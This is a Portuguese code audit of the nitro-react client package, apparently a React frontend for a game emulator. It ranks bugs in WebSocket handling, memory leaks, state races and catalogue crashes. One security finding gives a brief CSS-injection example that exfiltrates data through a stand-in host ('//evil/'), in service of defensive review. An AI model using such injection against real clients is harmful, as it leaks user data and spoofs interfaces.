# Análise de Código — `packages/nitro-react`

> Auditoria de qualidade, performance e correção do pacote `@nitrodevco/nitro-react`.
> Base analisada: `main` após merge de `upstream/main` (`036f650`).
> Stack: React 19 + React Compiler, Zustand 5, Pixi.js 8, TanStack Virtual, Vite 8.

Cada achado tem: arquivo/linha, severidade, categoria e **cenário concreto de falha**.
Achados marcados com ✔︎ foram verificados diretamente no código durante a auditoria.
Achados marcados com ⧉ foram apontados de forma independente por mais de um revisor (maior confiança).

> **Nota sobre o React Compiler:** o compilador está ativo globalmente (`vite.config.ts:55-57`),
> então memoização manual (`useMemo`/`useCallback`) ausente **não** é considerada defeito nesta análise.

---

## 🔴 Crítico

### C1. WebSocket nunca reconecta — uma queda "brica" a sessão inteira ✔︎
- **Arquivo:** `src/context/communication/WebSocketContextProvider.tsx:40-42` (guard) e `:75-87` (`onclose`)
- **Categoria:** correção / ciclo de vida
- `connect()` seta `hasConnected.current = true` e passa a retornar cedo para sempre. O `onclose`
  limpa `ws.current` e os buffers e vai para a fase `'closed'`, mas **nunca reseta `hasConnected`**
  e nada volta a chamar `connect()`. Não existe nenhuma lógica de reconnect/backoff no módulo.
- **Falha:** o emulador reinicia, ou cai a rede por 1s → o socket fecha → `isAuthenticated` vira
  `false` → `MainView` desmonta → **a conexão nunca mais se restabelece sem recarregar a página**.

### C2. Vazamento de RenderTextures no `AvatarImage` — nunca é feito `dispose()` ✔︎
- **Arquivo:** `src/components/AvatarImage.tsx:25-69`
- **Categoria:** memory-leak (GPU/VRAM)
- `GetAvatarRenderManager().createAvatarImage(...)` devolve um `IAvatarImage` dono de `RenderTexture`s
  do pool, liberadas apenas por `dispose()`. O efeito **não retorna cleanup** e nunca chama
  `avatarImage.dispose()` — nem ao re-executar (`figure`/`direction`/`randomValue` mudam) nem ao desmontar.
- **Falha:** cada abertura de infostand/bolha de avatar cria uma imagem nova e vaza suas texturas no
  `TexturePool`. Uma sessão abrindo infostands repetidamente cresce a memória de textura até o
  renderer degradar/travar.

### C3. `eventIds` é um `Map` singleton de módulo, compartilhado entre todas as salas ✔︎ ⧉
- **Arquivo:** `src/stores/room/RoomMouseSlice.ts:19-23` e `:32-41` (+ reset em `RoomStore.ts`)
- **Categoria:** correção / memory-leak
- `RoomMouseSliceInitialState.eventIds = new Map()` é criado **uma vez** no carregamento do módulo.
  `setRoom` "reseta" espalhando `...RoomMouseSliceInitialState` — reutilizando **a mesma referência**
  de `Map`. Pior: `setMouseEventId` faz `get().eventIds.set(...)` mutando em lugar, **sem `set()`**,
  então nenhum subscriber é notificado e a identidade do `Map` nunca muda.
- **Falha:** trocar da Sala A para a Sala B não limpa os event IDs; IDs antigos vazam para a nova sala,
  o `Map` cresce indefinidamente entre trocas de sala, e a dedup de clique em
  `RoomEventHandler.handleRoomCanvasMouseEvent` pode suprimir cliques legítimos na nova sala.

---

## 🟠 Alto

### A1. Crash no catálogo: hook desreferencia `product` antes do guard de nulo ✔︎
- **Arquivo:** `src/views/catalog/page/widgets/CatalogItemGridWidgetItemView.tsx:13`
- **Categoria:** correção (crash)
- `useProductIconUrl(product!)` roda na linha 13 e imediatamente faz `switch (product.productType)`,
  mas o guard `if (!offer || !product) return null` só vem na linha 17. O próprio `product!` +
  o null-check posterior provam que `product` pode ser `undefined` (ofertas só de badge/efeito são
  reduzidas a vazio).
- **Falha:** qualquer página de catálogo com uma oferta só-badge/só-efeito → **`TypeError` derruba a grade inteira**.

### A2. Crash no catálogo: `CatalogActivePage` não retorna nada fora de `default_3x3` ✔︎
- **Arquivo:** `src/views/catalog/page/CatalogActivePage.tsx`
- **Categoria:** correção (crash)
- O `switch (activePage.layoutCode)` só tem o case `default_3x3` e **nenhum `default`/fallback**,
  retornando `undefined` para qualquer outro layout.
- **Falha:** abrir qualquer página com `layoutCode` diferente (`spaces_new`, `frontpage4`, `club_buy`, …)
  → React lança *"Nothing was returned from render"*.

### A3. `removeCursorOwner` com guard invertido (`index === 1`) ✔︎ ⧉
- **Arquivo:** `src/stores/room/RoomMouseSlice.ts:57`
- **Categoria:** correção
- O guard de "não encontrado" é `if (index === 1) return x;` — deveria ser `=== -1`. Quando a chave
  não existe, `indexOf` retorna `-1`, o guard não pega, e `splice(-1, 1)` **remove o último owner** existente.
- **Falha:** remover um cursor-owner não rastreado apaga silenciosamente um owner ativo não relacionado,
  corrompendo o estado do cursor (ponteiro aparece/some errado). E quando `index` é de fato `1`, o owner real nunca é removido.

### A4. `onerror` só loga + pacote corrompido trava o processamento e cresce o buffer ✔︎
- **Arquivo:** `WebSocketContextProvider.tsx:71-73` (`onerror`) e `:163-197` (`decodeWrappers`)
- **Categoria:** correção / error-handling / memory-leak
- Em erro de socket o handler apenas loga (sem estado de falha, sem retry). E se `decode` lançar por
  motivo diferente de fragmentação, `consumed` fica no último offset bom e os bytes corrompidos
  permanecem em `wsBuffer`; todo frame seguinte re-anexa e re-tenta decodificar o mesmo prefixo corrompido.
- **Falha:** um único pacote dessincronizado → o cliente para de processar **todas** as mensagens
  seguintes enquanto `wsBuffer` cresce sem limite. Combinado com C1, qualquer erro que feche o socket
  deixa o app preso na tela de loading para sempre.

### A5. `AvatarImage`: load assíncrono sem cancelamento → imagem obsoleta + deps faltando ✔︎
- **Arquivo:** `src/components/AvatarImage.tsx:56-69`
- **Categoria:** race
- `load()` faz `setImageData(...)` sem qualquer token de geração e **sem checar `disposed.current`**.
  As deps `[figure, direction, randomValue]` omitem `gender`, `headOnly`/`setType`.
- **Falha:** trocar de avatar rapidamente dispara promises `getCroppedImageAsync` concorrentes; uma que
  resolve fora de ordem sobrescreve a imagem mais nova. Trocar só o `gender` mantendo a figure não recarrega.

---

## 🟡 Médio

### M1. Realocação O(n²) do buffer a cada frame de WebSocket ✔︎
`WebSocketContextProvider.tsx:89-98` — perf. `onmessage` aloca um `Uint8Array` novo (existente + recebido)
e copia todo o buffer acumulado a cada frame. Mensagens grandes fragmentadas em muitos frames TCP
(ex.: `ObjectsMessage`/`UsersMessage` na entrada da sala) → cópia O(n²); engasgos visíveis no load da sala.

### M2. Todo o loop de render é destruído/recriado a cada mudança de alvo da câmera
`components/room/RoomCanvas.tsx:19-98` — perf. O efeito depende de `updateRoomCamera`, cuja identidade
muda quando `targetId`/`targetCategory`/`cameraFollowDisabled`/`followDuration` mudam. Clicar num usuário
para seguir → cleanup remove ticker + `observer.disconnect`, depois re-adiciona o tick, re-appenda
`renderer.canvas` e re-`observe()` (disparando re-layout). Hitch/snap de câmera a cada troca de alvo.

### M3. `setRoom` faz efeito colateral (`dispose()`) dentro do updater do `set`
`stores/room/RoomStore.ts:35-49` — correção. `x.room.dispose()` é chamado dentro de `set(x => …)`.
Reducers devem ser puros; em StrictMode/retentativas o updater pode rodar duas vezes → double-dispose
do `IRoom` (double-free de recursos do renderer / erro na segunda chamada).

### M4. `FurnitureImage`: load assíncrono sem token de geração → imagem obsoleta
`components/FurnitureImage.tsx:19-35` — race. `disposed.current` só cobre unmount, não re-execuções.
Mudar `type`/`colorIndex`/`direction` rápido gera promises concorrentes; resolução fora de ordem
renderiza a furni anterior.

### M5. Fade da bolha usa tempo absoluto do ticker como delta → fecha instantâneo
`components/room/widgets/object-menu/RoomObjectMenuBubble.tsx:35-49,85-98` — correção. `updateFade` faz
`fadeTime.current += time`, onde `time` é `event.time` (timestamp acumulado absoluto), não um delta por frame.
No 1º frame de fade, `fadeTime` salta, `newOpacity = 1 - fadeTime/75` fica negativo e `onClose()` dispara
na hora — o fade nunca anima. (A bolha de nome ainda seta `fades` sem `onClose`, então nunca fecha.)

### M6. `useHoldToRepeat`: `callbackRef` capturado uma vez, nunca sincronizado ✔︎ ⧉
`hooks/ui/useHoldToRepeat.ts:9` — correção. `const callbackRef = useRef(callback)` é inicializado uma vez
e nenhum efeito o atualiza. O repeat sempre invoca o callback do primeiro render (o `ref` existe justamente
para evitar closure obsoleta, mas falha em cumprir isso). Um `step`/callback trocado é ignorado.

### M7. `reduce`-com-spread O(n²) para montar mapas de usuários/amigos ⧉
`stores/room/RoomUsersSlice.ts:30-39`, `stores/user/UserMessengerSlice.ts:36-45` e `:63-72` — perf.
`datas.reduce((acc, d) => ({ ...acc, [d.id]: d }), {})` realoca o acumulador a cada item. Sala lotada
(150+ usuários) ou lista de amigos grande (HC ~1000+) → quadrático a cada batch, causando hitches.
Usar loop simples / `Object.fromEntries`.

### M8. `selectSilver` retorna `credits` em vez de `silver` ✔︎
`stores/user/selectors/UserWalletSelectors.ts:7` — correção. `selectSilver = (state) => state.credits`
(copy-paste; o campo `silver` existe). Qualquer UI que leia silver por esse seletor mostra créditos.

### M9. `disableFollowTemporarily`: `setTimeout` sem handle/cleanup + race ✔︎ ⧉
`stores/room/RoomCameraSlice.ts:36-39` — memory-leak/correção. O timer nunca é guardado/limpo. Chamadas
repetidas empilham timers; a de duração menor dispara primeiro e reabilita o follow que deveria seguir
desabilitado. Se a sala for descartada antes do disparo, o callback muta um store obsoleto.

### M10. `useFrameStackStore` cresce sem limite / z-index nunca reseta
`stores/useFrameStackStore.ts` — memory-leak. `zIndexById` acumula uma entrada por frame já focado e
nunca é podado ao fechar frames; `topZIndex` incrementa monotonicamente para sempre.

### M11. `ScrollArea`: `showVertical` é computado mas `ScrollbarVertical` é sempre renderizado ✔︎
`theme/ScrollArea.tsx:44,54` — correção/perf. A linha 44 calcula `showVertical`, mas a 54 renderiza
`<ScrollbarVertical>` incondicionalmente (só o horizontal é gated). Com `orientation="horizontal"` você
ainda ganha uma barra vertical indesejada + um segundo `useScrollbarController` montando `scroll` listener
e `ResizeObserver` de 3 alvos no mesmo viewport à toa.

### M12. Scroll handler sem throttle/rAF: lê layout + `setState` a cada evento de scroll
`hooks/ui/useScrollbarController.ts:104,58` — perf. `recompute` roda síncrono por evento de scroll, lendo
`clientHeight/scrollHeight/scrollTop` (força reflow) e chamando `setState` — um render React por frame de
scroll, sem coalescer com `requestAnimationFrame`. Jank em listas grandes/momentum.

### M13. `useTintedVars`: setState em efeito → primeiro paint sem tint + render extra
`theme/utils/useTintedVars.ts` — perf/correção. `style` começa `undefined` e é preenchido após o
`tintImage` async resolver. Todo `Frame`/`Header`/`Button`/`Bubble` tintado renderiza uma vez com a borda
crua (sem tint) e re-renderiza com o `data:` URL — flash visível da cor errada + 2º render garantido por instância.

### M14. Janela do messenger acoplada à visibilidade da friendlist
`components/messenger/FriendListComponent.tsx:26` — correção. `if (!isVisible) return null` (visibilidade
da *friendlist*) corta toda a subárvore, que inclui `<MessengerComponent />`. O messenger nunca renderiza
com a friendlist fechada.

### M15. Navegação do catálogo muta objetos-nó do store diretamente
`context/catalog/useCatalogNavigation.tsx:79-93` — correção/bad-code. `activateNode` muta `n.isActive`/`n.isOpen`
in-place em nós guardados no store; a UI lê `node.isOpen` direto. O re-render só ocorre como efeito colateral
de `setActiveNodes`, então nós fora do novo array (ex.: um irmão sendo recolhido) têm a mutação invisível ao React → setas abre/fecha obsoletas.

### M16. Chaves duplicadas: `key={x.pageId}` colide para nós-pasta (`pageId === -1`)
`views/catalog/navigation/CatalogNavigationSetView.tsx:18` e `CatalogView.tsx:18` — correção. Nós container
têm `pageId === -1`; pastas irmãs compartilham a chave `-1` → keys duplicadas e vazamento de estado de reconciliação.

### M17. `InventoryFurniView`: efeito depende de `virtualRows` instável → roda todo render + loadMore ansioso ⧉
`views/inventory/InventoryFurniView.tsx:36-40,69` — perf/correção. `rowVirtualizer.getVirtualItems()` devolve
array novo a cada render, então o efeito roda sempre e chama `loadMore` (setState); só o guard `itemCount < MAX_ITEMS`
evita o loop render→efeito→setState. Renderiza 200 células placeholder com index-as-key, desligadas de dados reais.

### M18. Registro de construtores de pacote acontece em efeito, depois dos efeitos de subscribe dos filhos
`WebSocketContextProvider.tsx:321-326` vs `useMessageListener` — race. `registerManyIncoming/Outgoing` rodam
no efeito de mount do provider. React descarrega efeitos dos filhos antes dos do pai, então um consumidor
montado no mesmo passo faz subscribe antes dos ctors existirem → "Invalid listener" e no-op. Hoje só mascarado
porque os handlers estão atrás de `isAuthenticated`.

### M19. `setTimeout` de `ObjectRemoveMessage` captura `room` obsoleto e nunca é limpo
`handlers/room/useRoomFurnitureHandler.tsx:96-105` — race/memory-leak. `setTimeout(..., data.delay)` não é
rastreado/limpo; a closure captura o `room` atual. Sair/trocar de sala antes de `data.delay` → o timer ainda
dispara `room.removeRoomObjectFloor` num objeto de sala obsoleto/descartado. `data.delay` é controlado pelo
servidor, então muitos timers podem acumular.

### M20. `send`/`sendRaw` descartam pacotes silenciosamente quando o socket não está OPEN
`WebSocketContextProvider.tsx:241-244` — correção. `sendRaw` retorna em silêncio se o socket não está `OPEN`;
só o que é enviado na janela `'awaitingHandlers'` é bufferizado. Qualquer composer emitido em `'connecting'`/
`'closed'`/pós-queda é perdido sem erro nem retry.

### M21. Injeção de CSS via `url()` a partir de string controlada pelo emulador
`views/catalog/page/widgets/CatalogItemGridWidgetItemView.tsx:21` (+ `hooks/catalog/useProductIconUrl.tsx`) — segurança.
`style={{ backgroundImage: `url(${iconUrl})` }}` onde `iconUrl` é montado com `product.extraParam` (dado de furni
do servidor) sem escaping. Um `extraParam` com `)`/`;` quebra o valor do `url()` e injeta CSS arbitrário no style inline
(exfiltração via `background:url(//evil/...)`, spoofing de UI).

---

## 🟢 Baixo / Qualidade de código

- **B1.** `useFrameDrag.ts:55` e `useHoldToRepeat.ts:16` — padrão frágil `useEffect(() => cleanup, [cleanup])`.
  Hoje funciona **porque o React Compiler estabiliza a função de cleanup** (ela fecha só sobre refs estáveis);
  se o componente sofrer bailout de compilação ou o compiler for desativado nesse arquivo, o cleanup passa a
  rodar a cada render e **quebra o drag após o 1º movimento / o hold-to-repeat**. Preferir dep array vazio.
- **B2.** `useFrameDrag.ts:109-112` — dois `pointerdown` sem `pointerup` intermediário sobrescrevem `activeListenersRef`,
  vazando o primeiro par de listeners no `window` permanentemente.
- **B3.** `views/friendlist/FriendListFriends.tsx:36-38` — filtro case-sensitive: o nome é `toLowerCase()` mas o
  `filterValue` não; qualquer maiúscula no filtro zera os resultados.
- **B4.** `views/friendlist/FriendListSearch.tsx:60` — `isFriend(result)` (scan `Object.values(friends).find`) é
  chamado duas vezes na mesma linha por resultado → O(resultados × amigos × 2).
- **B5.** `views/catalog/page/widgets/CatalogItemGridWidgetView.tsx:10-11` — constantes `PAGE_SIZE`/`MAX_ITEMS`
  declaradas e nunca usadas (resquício de paginação removida); grade usa index-as-key. ⧉
- **B6.** `context/communication/useWebSocketContext.tsx:8` — mensagem de erro copy-paste: lança
  *"useRoomContext must be used within RoomContextProvider"* num contexto de WebSocket.
- **B7.** `handlers/room/useRoomMappingHandler.tsx:281-289` — efeito disco: `setInterval` é criado e
  `clearInterval` na linha seguinte (código morto; a chamada real está comentada). Nunca anima; e se ficasse
  ativo, não teria cleanup por unmount/troca de sala. ✔︎
- **B8.** `stores/system/SystemStore.ts:153` vs `:216-217` — inconsistência: floor faz replace (`{}`) e wall faz
  merge (`{ ...x.wallItems }`); num reload de furnidata os wall items acumulam entradas obsoletas.
- **B9.** `stores/system/SystemStore.ts:105-111` — `setLocalization` escreve `localizationNeedsUpdate`, campo que
  não existe no tipo `State` (chave não tipada silenciosa).
- **B10.** `hooks/logic/useConfigLoader.ts:23-24` e `useLocalizationLoader.ts:70-72` — não checam `response.ok`;
  um 200 servindo JSON malformado é mesclado silenciosamente em config/localization.
- **B11.** `utils/FixedSizeStack.ts:25,29` — `Math.max(...this._data)`/`min` espalham o array; com stack grande
  arrisca stack-overflow/GC churn. Manter min/max corrente em O(1).
- **B12.** `stores/room/actions/RoomUsersActions.ts:12-18` — tipo declara `getUserByRoomObjectId` mas o extractor
  emite `getUserDataByIndex`; funciona em runtime mas o tipo mente e não pega typos.
- **B13.** `theme/utils/VariantCascadeProvider.tsx:13` — `value={{ ...inherited, ...map }}` monta objeto novo por
  render (quase todo componente temático embrulha filhos aqui). Provável memo do compiler, mas frágil.
- **B14.** `views/catalog/page/widgets/CatalogItemGridWidgetView.tsx:23-29` — virtualizer com `estimateSize: () => 60`
  fixo e sem `measureElement`; se o item não medir 60px, conteúdo corta/sobrepõe e o thumb da scrollbar diverge do `getTotalSize()`.
- **B15.** `RoomObjectMenuBubble.tsx:16-17` — `FIXED_STACK`/`MAX_STACK` são singletons de módulo recriados em efeito
  `[]`; múltiplas bolhas compartilham e resetam a mesma pilha, corrompendo o empilhamento anti-overlap uma da outra.
- **B16.** `views/inventory/InventoryFurniView.tsx:46` — `<input type="text w-full overflow-hidden px-2">`: uma string
  de classes foi escrita no atributo `type` (input inválido → cai para `text`, sem estilo). ✔︎
- **B17.** `package.json` — `dompurify` é declarado como dependência mas **não é importado em lugar nenhum** do
  `src` (dependência morta; ou sanitização faltando, caso HTML do emulador venha a ser renderizado). ✔︎
- **B18.** `MainView.tsx:23-38` — bootstrap `isReady` em três efeitos separados (todos keyed em `isReady`) força um
  ciclo de render extra (mount → null → setIsReady → render com conteúdo). Poderia ser um único efeito de mount.
- **B19.** `hooks/logic/useAvatarLoader.ts:15-69` — deps `[figureMapUrl, effectMapUrl]` omitem `figureDataUrl`/
  `avatarAssetUrl` que gate os loads. Só funciona porque hoje o config é aplicado num único `setConfig`; se virar
  incremental, o mapa de figuras nunca processa e os avatares não renderizam, sem re-run para recuperar.

---

## ✅ Pontos verificados e considerados corretos (não são defeitos)

- `utils/framePositionStorage.ts` — `try/catch`, validação de tipos e guard de SSR bem feitos.
- `hooks/ui/useOutsideClick.ts` — listener de `pointerdown` adicionado/removido corretamente, usa `useEffectEvent`
  para evitar closure obsoleta.
- `hooks/ui/useScrollbarController.ts` — `ResizeObserver` é `disconnect()`ado e o `scroll` listener é removido no
  cleanup; refs de callback (`onReachStart/End`) são sincronizados por efeito (padrão correto).
- Seletores que retornam objeto usam `useShallow` no consumo; todos os Context providers passam **uma** instância
  estável de store (`useState(() => createStore())`) — evitando os clássicos "seletor retorna referência nova" e
  "value do provider muda todo render".
- `useRoomMouse` usa `canvas.onX =` com cleanup `null` (sem acúmulo de listeners); `useRoomEventDispatcher` pareia
  add/removeEventListener; ticker/observer do `RoomCanvas` são removidos no cleanup; `setRoom` chama `dispose()` na sala anterior.
- Sem uso de `dangerouslySetInnerHTML` no pacote — a principal superfície de XSS não existe neste snapshot.
- O único `setInterval` de longa duração (`FriendListComponent`, poll de amigos a cada 120s) é limpo corretamente.

---

## Prioridade de correção sugerida

1. **C1 + A4** — reconexão de WebSocket + descarte de pacote corrompido: juntos, qualquer queda ou 1 pacote ruim
   deixa o cliente permanentemente inutilizável. É o conserto de maior impacto.
2. **C2 + A5** — `dispose()` no `AvatarImage` e cancelamento por token de geração: para o vazamento de VRAM e as imagens obsoletas.
3. **A1 + A2** — os dois crashes garantidos do catálogo em interações comuns.
4. **C3 + A3** — `RoomMouseSlice`: `Map` per-instância (não singleton), usar `set()` na mutação e corrigir `index === -1`.
5. **M8** (`selectSilver`) e **M6** (`callbackRef` obsoleto) — bugs pequenos, alto retorno.

*Observação de escopo:* muitos módulos (`MessengerView`, `NotificationCenterView`, `HotelView`,
`Inventory{Badges,Pets,Bots}`) ainda são stubs; ~15 `useMessageListener` em `useMessengerHandler` têm corpo vazio,
então esses pacotes recebidos do emulador são descartados em silêncio — esperado num port em andamento, mas
vale rastrear para não virar comportamento "engolido".
